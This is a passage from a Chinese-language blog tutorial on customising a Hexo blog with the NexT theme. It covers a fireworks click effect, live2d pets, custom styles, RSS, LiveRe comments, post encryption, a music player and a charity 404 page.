class="attr">lineWidth</span>:<span class="number">0</span>,<span class="attr">alpha</span>:&#123;<span class="attr">value</span>:<span class="number">0</span>,<span class="attr">easing</span>:<span class="string">&quot;linear&quot;</span>,<span class="attr">duration</span>:anime.random(<span class="number">600</span>,<span class="number">800</span>)&#125;,<span class="attr">duration</span>:anime.random(<span class="number">1200</span>,<span class="number">1800</span>),<span class="attr">easing</span>:<span class="string">&quot;easeOutExpo&quot;</span>,<span class="attr">update</span>:renderParticule,<span class="attr">offset</span>:<span class="number">0</span>&#125;)&#125;<span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">var</span> a;<span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> n=<span class="built_in">this</span>,i=<span class="built_in">arguments</span>;<span class="built_in">clearTimeout</span>(a),a=<span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;e.apply(n,i)&#125;,t)&#125;&#125;<span class="keyword">var</span> canvasEl=<span class="built_in">document</span>.querySelector(<span class="string">&quot;.fireworks&quot;</span>);<span class="keyword">if</span>(canvasEl)&#123;<span class="keyword">var</span> ctx=canvasEl.getContext(<span class="string">&quot;2d&quot;</span>),numberOfParticules=<span class="number">30</span>,pointerX=<span class="number">0</span>,pointerY=<span class="number">0</span>,tap=<span class="string">&quot;mousedown&quot;</span>,colors=[<span class="string">&quot;#FF1461&quot;</span>,<span class="string">&quot;#18FF92&quot;</span>,<span class="string">&quot;#5A87FF&quot;</span>,<span class="string">&quot;#FBF38C&quot;</span>],setCanvasSize=debounce(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;canvasEl.width=<span class="number">2</span>*<span class="built_in">window</span>.innerWidth,canvasEl.height=<span class="number">2</span>*<span class="built_in">window</span>.innerHeight,canvasEl.style.width=<span class="built_in">window</span>.innerWidth+<span class="string">&quot;px&quot;</span>,canvasEl.style.height=<span class="built_in">window</span>.innerHeight+<span class="string">&quot;px&quot;</span>,canvasEl.getContext(<span class="string">&quot;2d&quot;</span>).scale(<span class="number">2</span>,<span class="number">2</span>)&#125;,<span class="number">500</span>),render=anime(&#123;<span class="attr">duration</span>:<span class="number">1</span>/<span class="number">0</span>,<span class="attr">update</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;ctx.clearRect(<span class="number">0</span>,<span class="number">0</span>,canvasEl.width,canvasEl.height)&#125;&#125;);<span class="built_in">document</span>.addEventListener(tap,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="string">&quot;sidebar&quot;</span>!==e.target.id&amp;&amp;<span class="string">&quot;toggle-sidebar&quot;</span>!==e.target.id&amp;&amp;<span class="string">&quot;A&quot;</span>!==e.target.nodeName&amp;&amp;<span class="string">&quot;IMG&quot;</span>!==e.target.nodeName&amp;&amp;(render.play(),updateCoords(e),animateParticules(pointerX,pointerY))&#125;,!<span class="number">1</span>),setCanvasSize(),<span class="built_in">window</span>.addEventListener(<span class="string">&quot;resize&quot;</span>,setCanvasSize,!<span class="number">1</span>)&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/laout/_layout.swig		<span class="comment">#添加</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% if theme.fireworks %&#125;   &lt;canvas class&#x3D;&quot;fireworks&quot; style&#x3D;&quot;position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;&quot; &gt;&lt;&#x2F;canvas&gt;    &lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;&#x2F;&#x2F;cdn.bootcss.com&#x2F;animejs&#x2F;2.2.0&#x2F;anime.min.js&quot;&gt;&lt;&#x2F;script&gt;    &lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;&#x2F;js&#x2F;fireworks.js&quot;&gt;&lt;&#x2F;script&gt;&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/_config.yml		<span class="comment">#在主题文件中加入</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Fireworksfireworks: true</span></span><br></pre></td></tr></table></figure>
<h3 id="添加打赏"><a href="#添加打赏" class="headerlink" title="添加打赏"></a>添加打赏</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Reward (Donate)</span></span><br><span class="line"><span class="attr">reward_settings:</span></span><br><span class="line">  <span class="comment"># 如果为true，则默认情况下会在每篇文章中显示奖励</span></span><br><span class="line">  <span class="comment"># 可以通过&quot; reward：true | false”在特定文章中显示或隐藏奖励</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">animation:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment">#comment: Donate comment here		#在这里发表评论</span></span><br><span class="line"></span><br><span class="line"><span class="attr">reward:</span></span><br><span class="line">  <span class="comment">#wechatpay: /images/wechatpay.png		#微信收款码</span></span><br><span class="line">  <span class="comment">#alipay: /images/alipay.png			#支付宝收款码</span></span><br><span class="line">  <span class="comment">#bitcoin: /images/bitcoin.png			#比特币收款</span></span><br></pre></td></tr></table></figure>
<h3 id="底部博客平台信息"><a href="#底部博客平台信息" class="headerlink" title="底部博客平台信息"></a>底部博客平台信息</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">powered:</span></span><br><span class="line">   <span class="comment"># Hexo (由Hexo提供支持)</span></span><br><span class="line">   <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">   <span class="comment"># 版本信息</span></span><br><span class="line">   <span class="attr">version:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">theme:</span></span><br><span class="line">   <span class="comment"># Theme (主题 - NexT.scheme).</span></span><br><span class="line">   <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">   <span class="comment"># 版本信息</span></span><br><span class="line">   <span class="attr">version:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<h2 id="其他配置文件配置"><a href="#其他配置文件配置" class="headerlink" title="其他配置文件配置"></a>其他配置文件配置</h2><h3 id="宠物"><a href="#宠物" class="headerlink" title="宠物"></a>宠物</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn add hexo-helper-live2d</span><br><span class="line">yarn add live2d-widget-model-tororo		<span class="comment">#安装一种宠物的模块</span></span><br><span class="line">vim _config.yml	<span class="comment">#博客的或主题的主配置文件都行,加入代码选择宠物类型</span></span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/EYHN/hexo-helper-live2d">hexo-helper-live2d</a><br><a href="https://github.com/xiazeyu/live2d-widget-models">live2d-widget-models</a></p>
<details><summary>宠物样式表</summary><br>

live2d-widget-model-chitose<br>
live2d-widget-model-epsilon2_1<br>
live2d-widget-model-gf<br>
live2d-widget-model-haru/01 (live2d-widget-model-haru)<br>
live2d-widget-model-haru/02 (live2d-widget-model-haru)<br>
live2d-widget-model-haruto<br>
live2d-widget-model-hibiki<br>
live2d-widget-model-hijiki<br>
live2d-widget-model-izumi<br>
live2d-widget-model-koharu<br>
live2d-widget-model-miku<br>
live2d-widget-model-ni-j<br>
live2d-widget-model-nico<br>
live2d-widget-model-nietzsche<br>
live2d-widget-model-nipsilon<br>
live2d-widget-model-nito<br>
live2d-widget-model-shizuku<br>
live2d-widget-model-tororo(白猫)<br>
live2d-widget-model-tsumiki<br>
live2d-widget-model-unitychan<br>
live2d-widget-model-wanko<br>
live2d-widget-model-z16<br>

</details>

<p><a href="https://blog.csdn.net/wang_123_zy/article/details/87181892">样式预览</a></p>
<p>需要先使用 <code>yarn add 模型的包名</code> 来安装</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">live2d:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">scriptFrom:</span> <span class="string">local</span></span><br><span class="line">  <span class="attr">pluginRootPath:</span> <span class="string">live2dw/</span>	<span class="comment"># 插件在站点上的根目录(相对路径)</span></span><br><span class="line">  <span class="attr">pluginJsPath:</span> <span class="string">lib/</span>	<span class="comment"># 脚本文件相对与插件根目录路径</span></span><br><span class="line">  <span class="attr">pluginModelPath:</span> <span class="string">assets/</span>	<span class="comment"># 模型文件相对与插件根目录路径</span></span><br><span class="line">  <span class="attr">tagMode:</span> <span class="literal">false</span>	<span class="comment"># 标签模式, 是否仅替换 live2d tag标签而非插入到所有页面中</span></span><br><span class="line">  <span class="attr">debug:</span> <span class="literal">false</span>	<span class="comment"># 调试, 是否在控制台输出日志</span></span><br><span class="line">  <span class="attr">model:</span></span><br><span class="line">    <span class="attr">use:</span> <span class="string">live2d-widget-model-tororo</span>	<span class="comment"># 模块名，博客根目录/node_models/ 下的目录名</span></span><br><span class="line">  <span class="attr">display:</span>		<span class="comment">#放置位置和大小</span></span><br><span class="line">    <span class="attr">position:</span> <span class="string">right</span></span><br><span class="line">    <span class="attr">width:</span> <span class="number">300</span></span><br><span class="line">    <span class="attr">height:</span> <span class="number">600</span></span><br><span class="line">  <span class="attr">mobile:</span></span><br><span class="line">    <span class="attr">show:</span> <span class="literal">true</span>		<span class="comment">#是否在手机端显示</span></span><br></pre></td></tr></table></figure>
<h3 id="文章插入图片"><a href="#文章插入图片" class="headerlink" title="文章插入图片"></a>文章插入图片</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim _config.yml		<span class="comment">#修改博客配置文件，开启资源文件夹</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">true</span></span><br><span class="line"><span class="comment">#开启后新建文章的时会同时创建一个同名文件夹用于存放文章资源（如:图片）</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn add hexo-asset-image 	<span class="comment">#安装插件</span></span><br><span class="line">vim node_modules/hexo-asset-image/index.js   <span class="comment">#修改文件配置，修正一个错误</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> endPos = link.length-<span class="number">1</span>;	<span class="comment">//将第24行修改为这样</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>将图片放到该文件夹下，在文章中添加图片</strong></p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">![<span class="string">image_name</span>](<span class="link">name.jpg</span>)		#只需要添加文件名即可，无需加上目录</span><br></pre></td></tr></table></figure>
<h1 id="自定义样式（next-v7）"><a href="#自定义样式（next-v7）" class="headerlink" title="自定义样式（next v7）"></a>自定义样式（next v7）</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/_config.yml</span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义自定义文件路径</span></span><br><span class="line"><span class="comment"># 在站点目录`source/_data`中创建自定义文件，并在下面取消注释所需的文件</span></span><br><span class="line"><span class="attr">custom_file_path:</span></span><br><span class="line">  <span class="comment">#head: source/_data/head.swig</span></span><br><span class="line">  <span class="comment">#header: source/_data/header.swig</span></span><br><span class="line">  <span class="comment">#sidebar: source/_data/sidebar.swig</span></span><br><span class="line">  <span class="comment">#postMeta: source/_data/post-meta.swig</span></span><br><span class="line">  <span class="comment">#postBodyEnd: source/_data/post-body-end.swig</span></span><br><span class="line">  <span class="comment">#footer: source/_data/footer.swig</span></span><br><span class="line">  <span class="comment">#bodyEnd: source/_data/body-end.swig</span></span><br><span class="line">  <span class="comment">#variable: source/_data/variables.styl</span></span><br><span class="line">  <span class="comment">#mixin: source/_data/mixins.styl</span></span><br><span class="line">  <span class="attr">style:</span> <span class="string">source/_data/styles.styl</span></span><br></pre></td></tr></table></figure>
<h2 id="文章阴影"><a href="#文章阴影" class="headerlink" title="文章阴影"></a>文章阴影</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim <span class="built_in">source</span>/_data/styles.styl	<span class="comment">#添加自定义样式</span></span><br></pre></td></tr></table></figure>
<figure class="highlight styl"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Custom styles.</span></span><br><span class="line"><span class="comment">// 主页文章添加阴影效果</span></span><br><span class="line"> <span class="selector-class">.post</span> &#123;</span><br><span class="line">   <span class="attribute">margin-top</span>: <span class="number">60px</span>;</span><br><span class="line">   <span class="attribute">margin-bottom</span>: <span class="number">60px</span>;</span><br><span class="line">   <span class="attribute">padding</span>: <span class="number">25px</span>;</span><br><span class="line">   -webkit-<span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span> rgba(<span class="number">105</span>,<span class="number">105</span>,<span class="number">105</span>,<span class="number">0.5</span>);</span><br><span class="line">   -moz-<span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span> rgba(<span class="number">105</span>,<span class="number">105</span>,<span class="number">105</span>,<span class="number">0.5</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h2 id="背景图"><a href="#背景图" class="headerlink" title="背景图"></a>背景图</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim <span class="built_in">source</span>/_data/styles.styl	<span class="comment">#添加指自定义样式</span></span><br><span class="line">mkdir <span class="built_in">source</span>/images		<span class="comment">#创建图片存放目录，然后将背景图放到该目录下即可</span></span><br></pre></td></tr></table></figure>
<figure class="highlight styl"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 添加背景图片</span></span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  background: url(/images/background.jpg);</span><br><span class="line">  <span class="attribute">background-size</span>: cover;</span><br><span class="line">  <span class="attribute">background-repeat</span>: no-repeat;</span><br><span class="line">  <span class="attribute">background-attachment</span>: fixed;</span><br><span class="line">  <span class="attribute">background-position</span>: <span class="number">50%</span> <span class="number">50%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//文章内容的透明度设置</span></span><br><span class="line"><span class="selector-class">.content-wrap</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0.8</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//侧边框的透明度设置</span></span><br><span class="line"><span class="selector-class">.sidebar</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0.8</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//站点概况透明度设置</span></span><br><span class="line"><span class="selector-class">.sidebar-inner</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: rgba(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">0.8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//菜单栏的透明度设置</span></span><br><span class="line"><span class="selector-class">.header-inner</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: rgba(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">0.3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//搜索框（local-search）的透明度设置</span></span><br><span class="line"><span class="selector-class">.popup</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0.85</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="https://www.wolfdan.cn/Hexo-Next-Gemini%E4%B8%BB%E9%A2%98%E9%80%8F%E6%98%8E%E5%8C%96%E4%BB%A5%E5%8F%8A%E8%83%8C%E6%99%AF%E5%9B%BE%E7%89%87%E7%9A%84%E6%9B%B4%E6%94%B9/">参考I</a><br><a href="http://mkco.xyz/2020/04/02/Hexo%E8%AE%BE%E7%BD%AE/Next7.0+%E8%83%8C%E6%99%AF%E7%9A%84%E8%AE%BE%E7%BD%AE/">参考II</a></p>
<p>解决按钮透明度: <code>themes\next\source\css\_common\components\post\post-button.styl</code> 同上修改对应位置为 <code>background: transparent;</code></p>
<h2 id="字体颜色"><a href="#字体颜色" class="headerlink" title="字体颜色"></a>字体颜色</h2><p><strong>博客标题及菜单栏字体颜色</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim theme/next/<span class="built_in">source</span>/css_/common/components/header/site-meta.styl</span><br></pre></td></tr></table></figure>
<figure class="highlight styl"><table><tr><td class="code"><pre><span class="line"><span class="attribute">color</span>: <span class="number">#00BFFF</span>;		<span class="comment">//博客标题</span></span><br></pre></td></tr></table></figure>
<p><a href="http://tool.oschina.net/commons?type=3">颜色代码表</a><br><a href="https://www.colorhexa.com/">代码查询颜色</a></p>
<p>找到博客目录下<code>theme/next/source/css_common/components/header/menu.styl</code>文件，在a{}里面添加以下代码：</p>
<figure class="highlight styl"><table><tr><td class="code"><pre><span class="line"><span class="attribute">color</span>: <span class="number">#00BFFF</span>;		<span class="comment">//菜单栏</span></span><br></pre></td></tr></table></figure>
<p><strong>底部字体颜色</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim theme/next/<span class="built_in">source</span>/css/_common/components/header/menu.styl	<span class="comment">#a&#123;&#125;里面添加代码</span></span><br></pre></td></tr></table></figure>
<figure class="highlight styl"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.footer-inner</span> &#123;<span class="attribute">color</span>: <span class="number">#00688B</span>;&#125;</span><br></pre></td></tr></table></figure>
<p><strong>侧边栏字体颜色</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/<span class="built_in">source</span>/css/_custom/custom.styl	<span class="comment">#加入代码</span></span><br></pre></td></tr></table></figure>
<figure class="highlight styl"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#sidebar</span> &#123;           <span class="selector-tag">p</span>,<span class="selector-tag">span</span>,<span class="selector-tag">a</span> &#123;<span class="attribute">color</span>: <span class="number">#EE2C2C</span>;&#125;&#125;</span><br></pre></td></tr></table></figure>
<h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><h2 id="文章模板"><a href="#文章模板" class="headerlink" title="文章模板"></a>文章模板</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim scaffolds/post.md</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: &#123;&#123; title &#125;&#125;</span><br><span class="line">date: &#123;&#123; date &#125;&#125;</span><br><span class="line">tags: [标签1,标签2,...]</span><br><span class="line">categories: [1级分类,2级分类,...]</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- more --&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="配置链接文本样式"><a href="#配置链接文本样式" class="headerlink" title="配置链接文本样式"></a>配置链接文本样式</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/<span class="built_in">source</span>/css/_common/components/post/post.styl <span class="comment">#修改配置文件，在末尾加入</span></span><br></pre></td></tr></table></figure>
<figure class="highlight styl"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.post-body</span> <span class="selector-tag">p</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#0593d3</span>;</span><br><span class="line">  <span class="attribute">border-bottom</span>: none;</span><br><span class="line">  <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="number">#0593d3</span>;</span><br><span class="line">  &amp;:hover &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#fc6423</span>;</span><br><span class="line">    <span class="attribute">border-bottom</span>: none;</span><br><span class="line">    <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="number">#fc6423</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>.post-body</code> 是为了不影响标题</p>
<p><code>p</code> 是为了不影响“阅读全文”的显示样式</p>
<p>颜色可以自定义</p>
<h2 id="配置RSS"><a href="#配置RSS" class="headerlink" title="配置RSS"></a>配置RSS</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn add hexo-generator-feed	<span class="comment">#安装插件</span></span><br><span class="line">vim _config.yml		<span class="comment">#修改博客配置文件</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 添加RSS订阅配置内容</span></span><br><span class="line"><span class="attr">feed:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">atom</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">atom.xml</span></span><br><span class="line">  <span class="attr">limit:</span> <span class="number">20</span></span><br><span class="line">  <span class="attr">hub:</span></span><br><span class="line">  <span class="attr">content:</span></span><br><span class="line">  <span class="attr">content_limit:</span> <span class="number">140</span></span><br><span class="line">  <span class="attr">content_limit_delim:</span> <span class="string">&#x27; &#x27;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/_config.yml	<span class="comment">#修改主题配置文件</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="string">rss:/atom.xml</span></span><br></pre></td></tr></table></figure>
<h2 id="配置评论系统"><a href="#配置评论系统" class="headerlink" title="配置评论系统"></a>配置评论系统</h2><p>到来必力注册登录，安装免费版填入相关信息后获得一串代码，在代码中有一串<code>uid</code>，将<code>uid值</code>复制出出来添加到主题配置文件中即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- 来必力City版安装代码 --&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;lv-container&quot; data-id&#x3D;&quot;city&quot; data-uid&#x3D;&quot;MTAyMC80NTMxNS8yMTgyOA&#x3D;&#x3D;&quot;&gt;</span><br><span class="line">	&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">   (function(d, s) &#123;</span><br><span class="line">       var j, e &#x3D; d.getElementsByTagName(s)[0];</span><br><span class="line"></span><br><span class="line">       if (typeof LivereTower &#x3D;&#x3D;&#x3D; &#39;function&#39;) &#123; return; &#125;</span><br><span class="line"></span><br><span class="line">       j &#x3D; d.createElement(s);</span><br><span class="line">       j.src &#x3D; &#39;https:&#x2F;&#x2F;cdn-city.livere.com&#x2F;js&#x2F;embed.dist.js&#39;;</span><br><span class="line">       j.async &#x3D; true;</span><br><span class="line"></span><br><span class="line">       e.parentNode.insertBefore(j, e);</span><br><span class="line">   &#125;)(document, &#39;script&#39;);</span><br><span class="line">	&lt;&#x2F;script&gt;</span><br><span class="line">&lt;noscript&gt; 为正常使用来必力评论功能请激活JavaScript&lt;&#x2F;noscript&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;!-- City版安装代码已完成 --&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/_config.yml	<span class="comment">#修改主题配置文件</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#找到LiveRe comments system</span></span><br><span class="line"><span class="comment"># LiveRe comments system</span></span><br><span class="line"><span class="comment"># You can get your uid from https://livere.com/insight/myCode (General web site)</span></span><br><span class="line"><span class="attr">livere_uid:</span> <span class="string">MTAyMC80NTMxNS8yMTgyOA==</span></span><br></pre></td></tr></table></figure>
<h2 id="文章加密"><a href="#文章加密" class="headerlink" title="文章加密"></a>文章加密</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn add hexo-blog-encrypt	<span class="comment">#安装插件</span></span><br><span class="line">vim _config.yml		<span class="comment">#配置博客配置文件，文件内没有就自行添加</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Security</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="attr">encrypt:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>给文章加密</p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: 文章标题</span><br><span class="line">date: 2016-03-30 21:18:02</span><br><span class="line">password: 123456	#密码</span><br><span class="line">abstract: 有东西被加密了, 请输入密码查看.</span><br><span class="line">message: 您好, 这里需要密码.</span><br><span class="line">wrong<span class="emphasis">_pass_</span>message: 抱歉, 这个密码看着不太对, 请再试试.</span><br><span class="line">wrong<span class="emphasis">_hash_</span>message: 抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<h2 id="侧边栏加入音乐播放器"><a href="#侧边栏加入音乐播放器" class="headerlink" title="侧边栏加入音乐播放器"></a>侧边栏加入音乐播放器</h2><p>到网易云音乐选择歌单，生成外链</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;iframe frameborder&#x3D;&quot;no&quot; border&#x3D;&quot;0&quot; marginwidth&#x3D;&quot;0&quot; marginheight&#x3D;&quot;0&quot; width&#x3D;298 height&#x3D;52 src&#x3D;&quot;&#x2F;&#x2F;music.163.com&#x2F;outchain&#x2F;player?type&#x3D;2&amp;id&#x3D;1365959078&amp;auto&#x3D;1&amp;height&#x3D;32&quot;&gt;&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/layout/_macro/sidebar.swig	<span class="comment">#将生成的外链放到合适的位置即可</span></span><br></pre></td></tr></table></figure>
<h2 id="文章结束标语"><a href="#文章结束标语" class="headerlink" title="文章结束标语"></a>文章结束标语</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/layout/_macro/passage-end-tag.swig	<span class="comment">#新建文件并加入内容</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &#123;% if not is_index %&#125;</span><br><span class="line">        &lt;div style&#x3D;&quot;text-align:center;color: #ccc;font-size:14px;&quot;&gt;-------------本文结束&lt;i class&#x3D;&quot;fa fa-paw&quot;&gt;&lt;&#x2F;i&gt;感谢阅读-------------&lt;&#x2F;div&gt;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/layout/_macro/post.swig	<span class="comment">#在post-body 之后(END POST BODY)， post-footer 之前添加如代码</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">  &#123;% if not is_index %&#125;</span><br><span class="line">    &#123;% include &#39;passage-end-tag.swig&#39; %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/_config.yml		<span class="comment">#加入以下内容</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 文章末尾添加“本文结束”标记</span></span><br><span class="line"><span class="attr">passage_end_tag:</span></span><br><span class="line">  <span class="attr">enabled:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<h2 id="腾讯公益404页面"><a href="#腾讯公益404页面" class="headerlink" title="腾讯公益404页面"></a>腾讯公益404页面</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim <span class="built_in">source</span>/404.html	<span class="comment">#添加代码</span></span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-cn&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>404<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;//qzonestyle.gtimg.cn/qzone/hybrid/app/404/search_children.js&quot;</span> <span class="attr">homePageName</span>=<span class="string">&quot;返回宝贝回家&quot;</span> <span class="attr">homePageUrl</span>=<span class="string">&quot;http://www.baobeihuijia.com&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
